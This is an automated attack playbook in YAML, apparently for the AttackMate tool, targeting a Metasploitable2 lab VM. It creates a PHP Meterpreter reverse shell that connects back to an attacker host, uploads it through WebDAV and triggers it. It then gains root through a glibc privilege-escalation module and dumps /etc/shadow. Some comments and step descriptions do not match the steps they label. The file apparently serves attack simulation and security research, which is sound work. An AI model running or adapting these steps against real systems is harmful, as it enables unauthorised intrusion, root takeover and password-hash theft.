#
# Authors: Wolfgang Hotwagner, Erik Grafendorfer
# Description:
#     This playbook perfoms the following attack-steps:
#     1. Create php-reverseshell-payload
#     2. Start reverseshell-listener in background
#     3. Upload php-reverseshell-payload via webdav
#     4. Execute php-reverseshell-payload via http-get in background
#     6. execute commands via reverseshell
#
# Requirements:
#     1. Run this on kali-linux
#     2. Metasploit installed and msfrpd executed
#     3. Target a Metasploitable2-VM
#
vars:
  METASPLOITABLE: 192.168.0.146
  ATTACKER: 192.168.0.29
  PAYLOAD: php/meterpreter/reverse_tcp
  LPORT: "4410"

commands:
  - type: mktemp
    variable: RSHELL
    metadata:
      description: "Prepare directory for reverse shell"

  # generate reverse-shell
  - type: msf-payload
    cmd: $PAYLOAD
    payload_options:
      LHOST: $ATTACKER
      LPORT: $LPORT
    format: raw
    local_path: ${RSHELL}.php
    metadata:
      description: "Generate php reverse shell"

  # start shell-listener in background
  - type: msf-module
    creates_session: shell
    cmd: exploit/multi/handler
    payload: $PAYLOAD
    payload_options:
      LHOST: $ATTACKER
      LPORT: $LPORT
    background: true
    kill_on_exit: true
    metadata:
      description: "Start local listener for reverse shell"

  # upload shell via webdav
  - type: http-client
    cmd: PUT
    url: http://$METASPLOITABLE/dav/shell.php
    local_path: ${RSHELL}.php
    metadata:
      description: "Start local listener for reverse shell"
      techniques: "T1190,T1105"
      tactics: "Initial Access,Command and Control"

  # wait two seconds
  - type: sleep
    seconds: 10

  # execute shell via http-get in background
  - type: http-client
    cmd: GET
    url: http://$METASPLOITABLE/dav/shell.php
    background: true
    kill_on_exit: true
    metadata:
      description: "Trigger execution of php reverse shell"
      techniques: "T1190,T1059"
      tactics: "Initial Access,Execution"

  - type: sleep
    seconds: 10

  # execute command in reverse-shell
  - type: msf-session
    stdapi: True
    cmd: getuid
    session: shell
    metadata:
      description: "Verify shell access"
      techniques: "T1033"
      tactics: "Discovery"

  - type: msf-session
    cmd: sysinfo
    session: shell
    metadata:
      description: "Retrieve system information"
      techniques: "T1082"
      tactics: "Discovery"

  - type: debug
    varstore: True
    metadata:
      description: "Print attackmate variables"

  - type: msf-module
    cmd: exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
    creates_session: root
    payload: linux/x86/meterpreter/reverse_tcp
    payload_options:
      LHOST: $ATTACKER
      LPORT: "4448"
    session: shell
    metadata:
      description: "Gain root privileges on Linux systems by abusing a vulnerability in the GNU C Library"
      techniques: "T1068"
      tactics: "Privilege Escalation"

  - type: msf-session
    cmd: getuid
    session: root
    metadata:
      description: "Verify shell access"
      techniques: "T1033"
      tactics: "Discovery"

  - type: msf-session
    cmd: cat /etc/shadow
    session: root
    metadata:
      techniques: "T1003.008"
      tactics: "Credential Access"
